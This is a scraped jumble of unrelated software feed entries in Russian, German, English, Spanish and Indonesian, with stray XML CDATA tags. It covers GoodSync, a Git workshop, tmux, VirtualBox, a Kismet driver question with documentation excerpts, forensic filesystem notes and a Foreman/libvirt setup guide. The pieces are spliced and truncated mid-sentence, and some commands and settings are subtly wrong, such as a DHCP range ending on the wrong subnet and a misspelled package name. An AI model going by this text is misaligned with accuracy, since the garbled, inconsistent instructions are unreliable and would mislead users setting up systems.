Use the dropdown list to select another drive then press the “Represent” button
Hover the mouse over the drawn area to display the partition information in the panel just below the drive dropdown list

Даже  допуская ваша память настолько замечательна что вы можете держать все изменения файлов в голове все же есть другие способы применить ваши  способности. Пусть GoodSync позаботится о последних изменениях в ваших файлах. Эта программа ищет последнюю версию файла в указанных папках  и копирует в другую папку, то есть синхронизует их. В отличие от других файловых синхронизаторов, которые просто копируют файл с самым  последним временем модификации, GoodSync использует нетривиальный алгоритм который не зависит от точности системных часов. Поэтому GoodSync  эффективен, безопасен и стабилен, и, кроме того, прост в использовании. Все что вам нужно сделать это указать локальные или сетевые  каталоги которые вы хотите синхронизовать и программа сделает все остальное. Если ваши компьютеры не соединены в сеть используйте для их  синхронизации сменный носитель, например USB драйв. GoodSync предназначен для работы в обе стороны, поэтому это не программа для резервного  копирования (backup). Однако каждый синхронизуемый каталог содержит копию другого, поэтому вы имеете резервную копию всех файлов без  дополнительных усилий.

  <summary><![CDATA[Einladung zum Workshop im Rahmen des Trainingsprogramms der Wizards of FOSS: 
Simone Frenzel: Erste Schritte mit GIT 
Git ist eine Freie Software zur verteilten Versionsverwaltung von Dateien, die ursprünglich für die Quellcode-Verwaltung des Linux-Kernels entwickelt wurde. 
Die Entwicklung von Git wurde im April 2005 von Linus Torvalds begonnen, um das bis dahin verwendete Versionskontrollsystem BitKeeper zu ersetzen, das durch eine Lizenzänderung vielen Entwicklern den Zugang verwehrte. Die erste Version erschien bereits wenige Tage nach der Ankündigung. 
Git läuft auf fast allen modernen UNIX-artigen Systemen, wie Linux, Solaris, Mac OS X, FreeBSD, DragonFly BSD, NetBSD, OpenBSD, AIX und IRIX. Auf Microsoft Windows läuft es entweder mit Hilfe der Cygwin-Umgebung oder mit Msysgit, bzw. der seit einiger Zeit verfügbaren TortoiseGit-Shell-Erweiterung (ähnlich TortoiseSVN). 
Die derzeit aktuelle Version wird produktiv für die Entwicklung des Linux-Betriebssystemkerns und im Rahmen vieler weiterer Projekte eingesetzt, darunter Git selbst, Samba, X.Org, Qt, GNOME, One Laptop per Child, Ruby on Rails, VLC, Wine, LilyPond, TaskJuggler, DragonFly BSD, Android, BusyBox, Amarok, Perl 5, x264 und phpBB. 
Inhalte des Workshops: 

Grundlegende Arbeitsschritte (Projekte erstellen, Änderungen, einpflegen und anschauen)
Parallele Entwicklung (Branches und Merges)
Die Interna — Wie funktioniert Git eigentlich?
Erweiterter Befehlssatz (Änderungen umordnen, markieren, zusammenfassen, löschen)
Jenseits der Kommandozeile — Git-Repositories verwalten per GUI, Integration in Eclipse
Verteilte Entwicklung – Wie man mit anderen Entwicklern Änderungen austauscht
Workflows – Verschiedene Ansätze, im Team mit Git zu arbeiten

Über Simone Frenzel 
Simone Frenzel kommt aus dem Bereich der Web- und Portalentwicklung und ist  auf das Themenfeld Java/Eclipse sowie die Versionsverwaltung für Software mit GIT spezialisiert,

  <title><![CDATA[tmux – FreeBSD, BSD* and Linux alterinative to GNU screen terminal emulator]]></title>
  <summary><![CDATA[After my yesterday  blog post explaining basis GNU screen use, I've decided to blog a bit more on the topic as I find terminal emulation to be quite interesting   
	Just like on on GNU / Linux, GNU Screen is available and installable via FreeBSD port – /usr/ports/sysutils/screen. Though screen is compatible with FreeBSD, it is not from scratch written to run on BSD architecture, but rather ported. Besides, that within the fild of terminal emulation, there are plenty of recent developments and feature richer programs available from install already. One of those I reference is tmux..  tmux's is superior to screen in that it is a re-writen terminal (from scratch) terminal emulator – multiplexer (as referenced in man tmux). 
Another fundamental difference is it comes licensed under "less restrictive" BSD license (interesting fact is BSD has only 3 clauses), whether to GNU Screen applies GPLv 2 / 3 (4 freedoms clauses). 
	Tmux is presently existing for multiple architectures besides BSD including Linux and even as I check in its documentation has support for HP-HX and IRIX. 
	To install / use tmux on FreeBSD / NetBSD install port /usr/ports/sysutils/tmux with 
	:  freebsd# cd /usr/ports/sysutils/tmux 
	freebsd# make install clean 
	.... 
	 
	Installing mux on Debian GNU Linux is available straight from default package repositories, i.e. : 
	 debian:~# apt-get install --yes mux 
	.... 
	 
	It is inteersting fact to mention, since OpenBSD 4.6 – Mr. Theo De Raddt and friends decided tmux to part of the base system! This means a lot since OpenBSD has always existed with the main ideology to be the most secure UNIX / BSD based OS around. This fact probably means from purely secure stand point tmux might be better choice than gnu screen 
	Another reason why tmux might be better alternative to Screen for BSD users besides security, is its configuration is much more simplistic whilst compared with Screen. If you have used screen, already you should surely know how complicated things are when it comes to configuration and screen (set) variables. 
	tmux's pre-defined command bindings are similar to SCREEN's, the difference is instead of Screen's: 
	CTRL + a + (letter) 
	key bindings are invoked with: 
	CTRL + b + (kbd letter) 
	  
People who already are acustomed to screen (like myself   )  would not be easy to re-learn use CTRL + b, thus it is helpful to revert default tmux CTRL + b  to screen's CTRL + a. 
 
http://niallohiggins.com/2009/06/04/tmux-a-bsd-alternative-to-gnu-screen/ 
	 $ echo 'set -g prefix C-a' >> ~/.tmux.conf 
	$ echo 'bind-key C-a last-window' >> ~/.tmux.conf 
	 
	Moving over virtual windows in tmux just like in screen can be done using: 
CTRL + a + 1 … 9 
One has to be careful, as pressing CTRL + a should be done with a llittle delay before pressing the next letter, otherwise the command does not take affect. 
	  
Detaching emulated session, in tmux is done like in screen with pressing: 
CTRL + a + (d [half a sec delay before pressing]) 
	 
Attaching to latest detached tmux session is done with: 
tmux attach 
  
There are plenty of other stuff and applications but here I will not get in detail as it is all  in man page. 
 
	tmux is great for BSD users, but for Linux users  byobu is  more interactive and user friendly (out of the box – with no need for extra configs) 
Here are 2 screenshots from tmux website:]]></summary>

  <summary><![CDATA[Crea un entorno específico para instalar virtualmente otro sistema operativo en tu ordenador  
Aunque pienses que el sistema operativo que tienes en tu equipo es el único que puede haber en tu ordenador, existen aplicaciones como ésta que te permiten crear un entorno adecuado y específico, dentro de tu disco duro, para poder instalar otro. 
 
¿Es posible tener dos sistemas operativos en un mismo ordenador sin que haya inevitables conflictos entre ambos? Sí, ya que podemos instalar un segundo sistema operativo si lo hacemos de manera virtual, de manera que no afectará al funcionamiento del sistema principal ni al suyo propio. 
 
VirtualBox es, precisamente, una aplicación que configura ese segundo sistema operativo dentro de tu equipo. Genera un marco de trabajo ad hoc y ahí lo coloca. VirtualBox es compatible para Windows (no incluye Windows 7), Linux y OpenBSD. 
 
Utilizar esta aplicación es bastante sencillo. Descarga la VirtualBox correspondiente al sistema operativo que vayas a cargar en tu equipo y ya puedes ejecutarlo. Para pasar a tu sistema operativo principal, sólo tienes que pulsar la tecla Control de la parte derecha del teclado de tu ordenador. 
 
Al parecer esta version de VirtualBox es incompatible con Windows 7 en su version de 64 bits con el service pack instalado.

  <summary><![CDATA[Hallo zusammen,  
 
ich würde gerne Kismet installieren, da ich sehen will welche Wlan Geräte in meiner Umgebung sind. 
ich habe es nach folgender Anleitung installiert und eingerichtet: 
http://wiki.ubuntuusers.de/Kismet 
allerdings erscheint folgende Fehlermeldung: 
Launching kismet_server: //usr/bin/kismet_server 
Suid priv-dropping disabled.  This may not be secure. 
No specific sources given to be enabled, all will be enabled. 
Non-RFMon VAPs will be destroyed on multi-vap interfaces (ie, madwifi-ng) 
Enabling channel hopping. 
Enabling channel splitting. 
FATAL: Unknown capture source type 'mac80211' in source 'mac80211,wlan0,6000Series' 
Done. 
 
wie es aussieht hab ich den falschen Treiber angegeben, kann mir jemand sagen welchen ich angeben muss? 
mit diesem Befehl: 
lspci | grep -i net  
habe ich die Wlan eigenschaften auslesen können: 
02:00.0 Network controller: Intel Corporation WiFi Link 6000 Series (rev 35) 
 
kann mir jemand sagen was ich falsch mache? welche Capture Sources muss ich angeben? 
 
danke im voraus 
 
 
12. Capture Sources 
     
    A capture source in Kismet is anything which provides packets to the Kismet 
    engine.  Capture sources define the underlying engine needed to capture 
    data from the interface, how to change channel, and how to enter rfmon 
    mode.  It is necessary to tell Kismet what specific type of card you use 
    because different drivers often use different methods to report information 
    and enter monitor mode. 
 
    Source type     Cards               OS          Driver 
    --------------- ------------------- ----------- ------------------------- 
    acx100          TI ACX100           Linux       ACX100 
                    http://acx100.sourceforge.net/ 
                    ACX100 drivers handle the 22mbit cards branded by D-Link 
                     and others. 
 
    admtek          ADMTek              Linux       ADMTek 
                    http://www.latinsud.com/adm8211/        (Patches) 
                    http://aluminum.sourmilk.net/adm8211/   (GPL driver) 
                    ADMTek drivers used in many consumer 802.11b cards. With 
                     the patches above, quasi-rfmon is possible - these cards 
                     appear to be almost entirely software controlled and  
                     always in a rfmon-like state.  This card WILL BROADCAST 
                     while in rfmon, rendering the sniffer visible. 
                    The fully GPL drivers are supported, in addition to the  
                     hacks to the non-free drivers. 
 
    airpcap         Airpcap USB         cygwin      CACE Tech 
                    http://www.cacetech.com/products/airpcap.htm 
                    The CACE AirPcap USB device allows native capture on 
                     Win32/Cygwin. 
                    The explicit airpcap source expects the Win32/Cygwin 
                     interface name.  This should be used once the source 
                     is identified via airpcap_ask or if multiple simultaneous 
                     sources are required. 
 
    airpcap_ask     Airpcap USB         cygwin      CACE Tech 
                    http://www.cacetech.com/products/airpcap.htm 
                    The CACE AirPcap USB device allows native capture on 
                     Win32/Cygwin. 
                    The airpcap_ask source lists available airpcap devices 
                     and allows the user to pick interactively. 
                    The 'capture interface' field is irrelevant and can be 
                     filled with any value (for example, 'dummy') 
 
    atmel_usb       Atmel-USB           Linux       Berlios-Atmel 
                    http://at76c503a.berlios.de/ 
                    These drivers work ONLY on USB cards (Sorry, no PCMCIA 
                     support).  Monitor mode support is limited and "faked" 
                     by bypassing part of the firmware and parsing packets 
                     directly, and is likely to not report all of the  
                     frames. 
                    This card MAY BROADCAST while in rfmon, rendering the 
                     sniffer visible. 
                    It appears that this card may be only formatting the  
                     beacons as an 802.11 stream, which means you likely 
                     will not see data frames, rendering most IDS functions, 
                     IP discovery, and data logging unavailable.

    cisco           Aironet 340,350     Linux       Kernel 2.4.10 - 2.4.19 
                    Standard Cisco cards in Linux.  Works only with 
                     the Linux kernel drivers, not the drivers found in 
                     pcmcia-cs. 
                    The drivers found on the cisco.com site can be patched 
                     with the files from the Kismet download site to add 
                     monitor mode with channel control, HOWEVER these drivers 
                     are extremely buggy for normal use and work only with 
                     the 2.4 kernel tree. 
                    The cisco drivers currently do not enter rfmon mode  
                     correctly, so channel control is not available.  The 
                     firmware will hop to whatever channel it feels like  
                     hopping to, when it feels like hopping. 
 
    cisco_wifix     Aironet 340,350     Linux       Kernel 2.4.20+, CVS   
                    http://sourceforge.net/projects/airo-linux/   
                    Capture interface:  'ethX:wifiX' 
                    Kernel 2.4.20+ and CVS drivers use ethX for normal mode 
                     and wifiX for monitor mode.  Kismet needs to know both 
                     devices, which may not necessarily be the same number, 
                     for example 'eth1:wifi0'. 
                    Linux kernel 2.4.20 and 2.4.21 have highly unstable cisco 
                     drivers and should be avoided. 
                    The cisco drivers currently do not enter rfmon mode  
                     correctly, so channel control is not available.  The 
                     firmware will hop to whatever channel it feels like  
                     hopping to, when it feels like hopping. 
 
    darwin          OSX native cards    OSX/Darwin  OSX 
                    Supports both Broadcom and Atheros Airport-Extreme cards. 
                    When using a Broadcom based card, it may be necessary to  
                     enable rfmon on the device for the first time using another  
                     program. 
                    When using an Atheros based card, 802.11a may also be supported 
                     by adding a 'sourcechannels' line to kismet.conf. 
 
    hostap          Prism/2             Linux       HostAP 0.4 
                    http://hostap.epitest.fi/ 
                    HostAP drivers drive the Prism/2 chipset in access point 
                     mode, but also can drive the cards in client and monitor 
                     modes.  The HostAP drivers seem to change how they go 
                     into monitor mode fairly often, but this source should  
                     manage to get them going. 
 
    ipw2100         Intel/Centrino      Linux       ipw2100-0.44+ 
                    http://ipw2100.sourceforge.net/ 
                    The Linux IPW2100/Centrino drivers for 802.11b cards 
                    now support rfmon, so here's support for them.  They act 
                    more or less like any other wireless interface would.

                    The Linux IPW2200/Centrino drivers for 802.11bg cards 
                    support rfmon as of 1.0.4 and firmware 2.3.   
                    Signal level reporting requires radiotap be turned on 
                    in the makefile while compiling the driver.  Noise levels 
                    are not reported.

                    The Linux IPW2200/Centrino drivers for 802.11bga cards 
                    support rfmon as of 1.0.4 and firmware 2.3.   
                    This is the same as ipw2200 but defaults to scanning the 
                    802.11a channel range in addition to 802.11b/g. 
                    Signal level reporting requires radiotap be turned on 
                    in the makefile while compiling the driver.  Noise levels

                    The Linux IPW3945/Centrino drivers for Intel Core

                    http://ipw3945.sourceforge.net/ 
                    The ipw3945 and patched ipw2200 drivers support a  
                    special mode which allows monitor-mode style sniffing 
                    while remaining associated.  Channel hopping is not 
                    possible, as the card is still associated to a  
                    specific AP, but single-channel IDS and sniffing can 
                    be accomplished.  See the ipw driver mailing list 
                    archives for information about patching your drivers.

                    The Orinoco drivers which have mainlined into the Linux 
                     kernel do support monitor mode, however only specific firmware 
                     versions are supported and often they do not work. 
                    An up-ported version of the older Orinoco drivers which more 
                     reliably supported rfmon may be available at: 
                     http://www.projectiwear.org/~plasmahh/orinoco.html 
                    Generally, Orinoco cards are not recommended for use with 
                     Kismet due to these limitations.

                    The ZD1211 drivers have had some regressions which lead to  
                     data corruption while changing channel.  Some versions  
                     work, and typically the aircrac patches resolve the 
                     corruption issues if your version doesn't properly handle 
                     rfmon. 
 
    Chipsets known to NOT WORK: 
     Broadcom           - No linux drivers, only useable with ndiswrapper or 
                          linuxant wrappers around windows drivers. 
                          *** UPDATE *** 
                          See the bcm43xx source type entry.  There are 
                          experimental reverse-engineered drivers which have 
                          monitor mode support now under Linux!  If they don't 
                          work, however, then too bad.

                          may not.  Currently theres no solution for OSX but 
                          I'm looking for OSX hackers interested in redoing the

     HermesII           - Proxim successor to the Orinoco/HermesI.  No support 
                          yet in the drivers, may be available in the future. 
     ndiswrapper        - Anything using ndiswrapper is using WINDOWS drivers

HFS didukung secara langsung oleh Mac OS. HFS sebagian besar digunakan di dalam versi lama Mac OS tetapi masih didukung dalam versi lebih baru. Ukuran volume maksimum HFS di Mac OS 6 dan 7 adalah 2 GB. Ukuran volume maksimum HFS dalam Mac OS 7.5 adalah  4 GB. Mac O 7.5.2 dan sistem operasi Mac yang terbaru meningkatkan ukuran volume maksimum HFSmenjadi2TB.•     HFS Plus. HFS Plus didukung secara langsung oleh Mac OS 8.1 dan versi selanjutnya dan ia merupakan sebuah filesistem berjurnal di Mac OS X. HFS Plus adalah penerus HFS dan memberikan banyak peningkatan seperti mendukung nama file yang panjang dan nama file Unicode untuk penamaan file internasional. Ukuran volume maksimum HFS Plus adalah 2 TB.File system dalam platform Mac OS X MacOS X menggunakan file system HFS Plus yang merupakan turunan dari Mac OS klasik yaitu. HFS plus adalah file system yang kaya metadata dan case preserve. Karena Mac OS X memiliki root milik Unix, aturan Unix juga ditambahkan dalam HFS Plus. Versi terbaru dari HFS plus menambahkan journaling untuk mencegah kerusakan pada struktur file system dan mengenalkan sejumlah optimasi dalam hal algoritma alokasi dalam usaha untuk memecah file secara otomatis tanpa membutuhkan defragmenter luar.  Nama file dapat mencapai 255 karakter. HFS Plus menggunakan pengkodean Unicode untuk menyimpan nama file. Dalam Mac OS X, tipe file dapat diambil dari type code yang disimpan dalam metadata atau nama file.  HFS Plus memiliki tiga macam link: Hard Link seperti pada Unix, Link simbolis Unix, dan alias. Alias didesain untuk menangani link ke file asli meski file tersebut telah dipindah ataupun diubah namanya. Alias ini tidak diinterpretasikan dalam file system, tapi pada kode File Manager pada userland.  Mac OS X juga mendukung penggunaan File System UFS yang merupakan turunan dari  File System Unix BSD.Unix File System (UFS). UFS didukung secara asli oleh beberapa jenis sistem  operasi Unix, termasuk Solaris, FreeBSD, OpenBSD, dan Mac OS X Namun demikian, kebanyakan sistem operasi sudah menambahkan fitur khusus, sehingga detil UFS berbeda antar implementasi.Compact Disk File System (CDFS). Seperti indikasi namanya, CDFS filesistem digunakan untuk CD.4.3 File system dalam platform Microsoft Windows Microsoft Windows menggunakan file system FAT dan NTFS .File System FAT (File Allocation Table) yang didukung oleh semua versi Microsoft Windows merupakan evolusi file system yang digunakan dalam MS DOS. Selama bertahun-tahun, banyak fitur telah ditambahkan dalam pengembangannya, yang terinspirasi dari fitur serupa yang ada pada file system yang dipakai pada Unix. Versi lama dari file system FAT (FAT12 dan FAT16) memiliki keterbatasan dalam memberikan nama file, batasan dalam hal jumlah entri dalam direktori root dalam file system dan batasan jumlah maksimum partisi. Secara spesifik, FAT12 dan FAT16 membatasi nama file hanya sampai 8 karakter dan 3 karakter untuk perluasan. VFAT yang merupakan perluasan dari FAT12 dan FAT16 mulai diperkenalkan pada Windows NT dan berikutnya dimasukkan dalam Windows 95, yang mengijinkan nama file yang panjang.  NTFS yang diperkenalkan bersama dengan Wndows NT mengijinkan kontrol berbasis Access Control List. NTFS juga mendukung Hard link, aliran file jamak, indexing atribut, pengecekan kuota, kompresi dan menyediakan mount point untuk file system lainnya.  Tidak seperti Sistem Operasi lainnya, Windows menerapkan abstraksi berupa drive letter pada level user untuk membedakan sebuah disk atau partisi dari yang lain. Sebagai contoh, path C:\Windows menunjukkan direktori Windows pada partisi yang ditunjukkan oleh label huruf C. Drive dalam jaringan juga dapat di-map menjadi drive letter.  Proses pengambilan data Sistem Operasi memanggil IFS (Installable File System) manager. IFS kemudian Memanggil FSD (File System Driver) yang sebenarnya untuk membuka file yang diminta dari beberapa pilihan FSD yang bekerja untuk File System yang berbeda –NTFS, VFAT, CDFS (untuk drive optikal) dan network drive. FSD kemudian mendapatkan info lokasi kluster pertama dari file pada disk dari FAT, VFAT atau MFT (Master File Table). MFT inilah yang yang memetakan semua file pada disk dan merekan jejak di mana file disimpan. File IdentificationFile format identifikasi adalah proses untuk mencari tahu format dari urutan byte. System operasi biasanya mencari tahu format dari urutan byte melalui ekstensi file ataupun melalui informasi yang terdapat pada MIME. Aplikasi forensik perlu mengidentifikasi jenis file dari konten.TIMEData recovery merupakan bagian dari analisa forensik di mana hal ini merupakan komponen penting di dalam mengetahui apa yang telah terjadi, rekaman data, korespondensi, dan petunjuk lannya. Banyak orang tidak menggunakan informasi yang berasal dari data recovery karena dianggap tidak murni/asli/orisinil. Setiap sistem operasi bekerja dalam arah yang unik, berbeda satu sama lain (walaupun berplatform sistem operasi yang sama). Untuk melihat seberapa jauh data sudah dihapus atau belum, perlu memperhatikan segala sesuatu yang ada dalam raw disk. Jika data yang digunakan untuk kejahatan ternyata masih ada, maka cara yang termudah adalah menguji data dengan pemanfaatan tool yang ada pada standar UNIX, seperti strings, grep, text pagers, dan sebagainya. Sayangnya, tools yang ada tidak menunjukkan data tersebut dialokasikan di mana.Contohnya, intruder menghapus seluruh system log files (dimulai dari bulan, hari, dan waktu) dari minggu pertama Januari, seharusnya ditulis untuk melihat syslog tersebut: Melalui investigasi dari sistem yang dirusak oleh intruder, sistem files UNIX yang modern tidak menyebar contents dari suatu file secara acak dalam disk. Sebagai gantinya, sistem files dapat mencegah fragmentasi file, meskipun setelah digunakan beberapa tahun. File content dengan sedikit fragmentasi akan lebih mudah untuk proses recover dari pada file content yang menyebar dalam disk (media penyimpanan). Tetapi sistem file yang baik memiliki beberapa keuntungan lain, salah satunya mampu untuk menghapus informasi untuk bertahan lebih  lama dari yang diharapkan.Dalam kasus Linux, sistem file extension tidak akan menghapus lokasi dari urutan pertama 12 blok data yang t]]></summary>

  <title><![CDATA[Creating a development environment with Libvirt, KVM, and TheForeman]]></title>
  <summary><![CDATA[This blog post has been in my to-write pile for nearly 4 months now. I have two laptops at home, both of which are capable of running a few virtual machines. If you missed the news, I now work on Foreman full time, so obviously I want to use Foreman to manage my virtual machines. So it seems like the perfect opportunity to give you a blog post about getting Libvirt set up on a host of your choice (in this case, my laptop).  Let's start by discussing my assumptions. Firstly, my personal laptop runs Archlinux, but since my Foreman server will be a virtual machine (Debian Squeeze) this won't matter too much. Second I'm assuming you're going to use the NAT network inside libvirt, so discussions of bridging will not be found here (although it's easy to do). In summary, I will use:  Libvirt host: Archlinux, 64bit (192.168.212.1)Foreman VM: Debian Squeeze, 64bit (192.168.212.2)NAT network (specifically 192.168.212.0/24)          We will look at the setting up Libvirt with TFTP, bootstrapping a Foreman box, installing the proxy, and finally building a test vm from Foreman.  Special note: This blog relies on a feature only present in the nightly version of Foreman (specifically, host identification via tokens). As such, we'll be using the nightly packages.  Step 0 - LibvirtThis is step zero, because without libvirt we would be a bit stuck :). We start by installing libvirt and the kvm modules:     $ yaourt -S libvirt qemu-kvm We now need to set up a couple of things. Firstly, the kernel module:          $ modprobe kvm_intel   # or kvm_amd      (You might want to make that permanent on boot. I'm not always going to want my laptop to run VMs, so I haven't.) I do not need my libvirt service advertising itself, so I disable mDNS:                                                                                           $ echo "mdns_adv = 0" >> /etc/libvirt/libvirt.conf                            We also need to give our day-to-day user the right permissions. Archlinux uses PolKit for that:     $ gpasswd -a greg kvm    $ cat > /etc/polkit-1/localauthority/50-local.d/50-org.libvirt.unix.manage.pkla <<EOF    [Allow a user to manage virtual machines]                                          Identity=unix-user:greg                                                            Action=org.libvirt.unix.manage                                                     ResultAny=yes                                                                      ResultInactive=yes                                                                 ResultActive=yes                                                                   EOF                                                                             For brevity, I will assume your partition structure can handle the space requirements - VM image files go in /var/lib/libvirt/images. I put 100G of storage into that area via a Logical Volume. Now we can start libvirt. I use Systemd, so                                                                                                                       $ systemctl start libvirtd.service                                                                                                                          If all goes well, you will have libvirt in your processes (ps ax|grep libvirt).  Step 1 - Configuring LibvirtWe need to tweak Libvirt a bit for our purposes - specifically, it starts a dnsmasq process to handle DNS and DHCP, which is fine, but we need to add the bootp IP for our eventual Foreman server First we need to edit the default network. I'd love to use 'virt-manager' for this step, as I find it easier than editing XML by hand, but 'virt-manager' cannot add the bootp option we need. So, we use 'virsh'. First we stop the network from running, and then edit it:      $ virsh     net-destroy default     net-edit default  Now you should see something like:      <network>       <name>default</name>       <uuid>2f2a01fe-fe6c-4f17-9f6d-2fb9d0ce6bc5</uuid>       <forward mode='nat'/>       <bridge name='virbr0' stp='on' delay='0' />       <mac address='52:54:00:27:1A:97'/>       <ip address='192.168.122.1' netmask='255.255.255.0'>         <dhcp>           <range start='192.168.122.2' end='192.168.122.254' />         </dhcp>       </ip>     </network>  We need to alter the range and add the bootp directive. Recall that Foreman will be static on 192.168.212.2, so we should start our DHCP range from 3. Make it look like this:     <ip address='192.168.212.1' netmask='255.255.255.0'>       <dhcp>         <range start='192.168.212.3' end='192.168.122.254' />         <bootp file='/pxelinux.0' server='192.168.212.2' />       </dhcp>     </ip> Save and exit. Finally we can restart the network:    net-start default You should then get something like this:     $ ifconfig virbr0                                                              virbr0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500  metric 1                inet 192.168.212.1  netmask 255.255.255.0  broadcast 192.168.212.255      You will also notice a dnsmasq process, bound to 192.168.212.1:       $ ps ax|grep dnsmasq     13972 ?        S      0:00 /sbin/dnsmasq --strict-order --bind-interfaces --pid-file=/var/run/libvirt/network/default.pid --conf-file= --except-interface lo --listen-address 192.168.212.1 --dhcp-range 192.168.212.3,192.168.212.254 --dhcp-leasefile=/var/lib/libvirt/dnsmasq/default.leases --dhcp-lease-max=252 --dhcp-no-override --dhcp-boot /pxelinux.0,,192.168.212.2   Step 2 - Building the Foreman box                                              So, at this point we have Libvirt, but no Foreman. Time to fix that! We start by downloading the install media of your choice (I used the Debian netinst CD). Once you have it, you can create a new VM in virt-manager (I called mine Foreman - I know, I am crazy :P). Simply click the "New VM" button in virt-manager, point it at the install CD, and get a basic install up and running. I am going to assume you know how to do a manual install of your favourite OS :). Bear in mind that we want to use a static IP for this server (192.168.212.2).                                                                                That will take you a while so I am going to go grab a coffee....                                                                                              ... Done yet? Good. We can set up Foreman then. We can refer to the excellent Foreman-installer puppet modules as discussed on [[theforeman.org][http://theforeman.org/projects/foreman/wiki/Using_Puppet_Module_ready_to_use]. We are going to use an All-In-One install. To do this, we need to ensure we will be using a relatively recent version of Puppet. At time of writing, Puppet 2.6.2 is in the Squeeze repo (too old) and Puppet 3 is not yet supported by Foreman. So we'll use th Puppetlabs repo and install a specific version of Puppet:       $ echo "deb http://apt.puppetlabs.com squeeze main" > /etc/apt/sources.list.d/puppetlabs.list     $ wget -q -O - http://apt.puppetlabs.com/pubkey.gpg | sudo apt-key add -     $ apt-get update     $ apt-get install -y puppet-common=2.7.19-1puppetlabs2 puppet=2.7.19-1puppetlabs2 puppetmaster-common=2.7.19-1puppetlabs2 puppetmaster=2.7.19-1puppetlabs2  We will also need git     $ apt-get install git-core  Then we will need the installer     $ git clone --recursive https://github.com/theforeman/foreman-installer.git Now we need to review the parameters in these modules. There are a lot of them, but for my purposes, most of the defaults are sane, so I will only list the ones I am changing for my setup:                                                                                   foreman/manifests/params.pp                                                      $ssl              = false     # ssl is not really need on my dev setup           $use_testing = true                                                                                    foreman-proxy/manifests/params.pp      $use_testing = true                                                                                   puppet/manifests/params.pp                                                       $git_repo = 'true'  # This is personal preference only, not required      Now the fun bit - installing Foreman:                                                                                   $ echo include puppet, puppet::server, foreman, foreman_proxy | puppet apply -v --modulepath /root/foreman-installer/ This will pull in and configure foreman, foreman-sqlite3 (good enough for my needs, but you may prefer mysql or postgres - set these up after the module finishes configuring foreman for you), but I will also need foreman-libvirt to manage my libvirt setup:                                                                                   $ apt-get install foreman-libvirt                                                $ touch /usr/share/foreman/tmp/restart.txt                                    If we now navigate to our VM (http://192.168.212.2 in my case) then we have Foreman up and running. Tadah!Step 3 - Configuring Foreman and Foreman Proxy                                 Let us start by making foreman show up in its own hosts page. Fortunately that is quite easy :)     $ puppet agent -v --noop -o --no-daemonize Now we need to add the proxy. Go to 'More->Smart Proxies' and click 'New Proxy'. You will probably need to add an entry to /etc/hosts to make this resolve, as Foreman (192.168.212.2) isn't in DNS. Don't just the IP here, as the server in the URL string is given to all the clients as the name of the Puppet Master     Name: Dev Proxy    URL: http://foreman.my.domain.com:8443/                                     Submit, and you should see a proxy with Puppet, PuppetCA, and TFTP features. So far, so good. You should also go to the Domains page and check the first puppet run created your vrtual domain. You might as well also edit it and give it a readable name in the blank box.  Lets move on to DNS/DHCP. We're aren't really going to manage these, but we still need to give some details to Foreman. Go to the More->Subnets page, add a new subnet, and fill it in something like this:      Name: Libvirt Network     Network: 192.168.212.0     Netmask: 255.255.255.0     Gateway: 192.168.212.1     Primary DNS: 192.168.212.1     Secondary DNS: 8.8.8.8     From / To / VLAN: [leave blank]     Domain: [tick the domain of your machine]     Dhcp: [None]     Tftp: [Your Proxy Name]     Dns: [None]   Nearly there! We need to add a compute resource. Go to 'More->Compute Resources' and click 'New Compute Resource'. Give it a name and select 'libvirt' as the provider. It will ask for a connection to the libvirt system, and this can be tricky to set up. Some people have managed to use the puppet certificates for SSL/TLS communication with the livbirt host, but I could not get it to work, so I am using restricted-access SSH keys:     su - foreman -s /bin/bash    ssh-keygen  # accept default file locations, no passphrase    # copy publickey to libvirt host (192.168.212.1 in my case)    ssh root@192.168.212.1  # if this works you are good to go You will also need the 'nc' binary on the libvirt host - on Archlinux it is actually nc.openbsd, so I had to create a symlink. The URL is 'virsh -c qemu+ssh:///root@192.168.212.1/system' - the Test Connection button is quite silent when everything works, so press it! If nothing happens, your libvirt connection is fine. Save the resource, and then select it and go to the 'Virtual Machines' tab - you should see your foreman box listed. Finally, we need to enable the Token-based installs. Go to More->Settings, select the Provisioning tab, and set Token_duration to something other than zero. I used 60 minutes.Step 4 - Building a VM                                                         Ok, home straight. We can now create Virtual Machines, but we need to test that the whole system hangs together. Go to 'Hosts' and select 'New Host'. You should then be able to create a Host using one of the OSes that Foreman comes pre-installed with (Ubuntu 12.04 for example). Foreman will ask you for an IP (because we're not managing DHCP in Foreman) but you can put anything you like here (I used 1.2.3.4). When the host first runs puppet and uploads it's facts to Foreman, it will replace 1.2.3.4 with the IP it got from Dnsmasq.  When you Submit the host, you should see a set of progress bars as Foreman creates the VM on libvirt, and the after you are redirected to the Host page, you can click the Console button to watch the install happen. Awesome! So, now you have a Foreman VM which can create other VMs. You also have a puppetmaster on there, which will accept code pushed to "puppet@192.168.212.2:puppet.git" so now you can test modules in a proper client/server virtual environment. Enjoy! Step 5 - Extra ExercisesThere are a few extra things you could do, if you want to play around some more: Use a different database - mysql and postgres are supportedAdd a different compute resource - EC2 is a good choice since you can get free machinesAdd bridged networking - sometimes those VMs need to be on the main network...Control DHCP/DNS with Foreman - this is tricky as you have to disable the built in dnsmasq server and set up bind9 and isc-dhcp-server on Foreman.Go forth and create virtual machines!]]></summary>

Aunque pienses que el sistema operativo que tienes en tu equipo es el único que puede haber en tu ordenador, existen aplicaciones como ésta que te permiten crear un entorno adecuado y específico, dentro de tu disco duro, para poder instalar otro. 
 
¿Es posible tener dos sistemas operativos en un mismo ordenador sin que haya inevitables conflictos entre ambos? Sí, ya que podemos instalar un segundo sistema operativo si lo hacemos de manera virtual, de manera que no afectará al funcionamiento del sistema principal ni al suyo propio. 
 
VirtualBox es, precisamente, una aplicación que configura ese segundo sistema operativo dentro de tu equipo. Genera un marco de trabajo ad hoc y ahí lo coloca. VirtualBox es compatible para Windows (no incluye Windows 7), Linux y OpenBSD. 
 
Utilizar esta aplicación es bastante sencillo. Descarga la VirtualBox correspondiente al sistema operativo que vayas a cargar en tu equipo y ya puedes ejecutarlo. Para pasar a tu sistema operativo principal, sólo tienes que pulsar la tecla Control de la parte derecha del teclado de tu ordenador. 
 
Al parecer esta version de VirtualBox es incompatible con Windows 7 en su version de 64 bits con el service pack instalado.

